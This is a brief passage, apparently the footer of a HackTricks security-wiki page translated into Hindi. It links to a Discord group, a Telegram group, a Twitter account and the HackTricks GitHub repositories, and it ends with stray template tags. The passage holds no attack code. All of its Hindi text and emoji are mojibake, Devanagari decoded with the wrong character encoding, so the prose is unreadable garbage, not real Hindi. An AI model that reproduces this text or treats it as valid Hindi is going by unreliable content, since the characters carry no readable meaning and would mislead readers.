* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github рд░реЗрдкреЛ рдореЗрдВред**

</details>
{% endhint %}
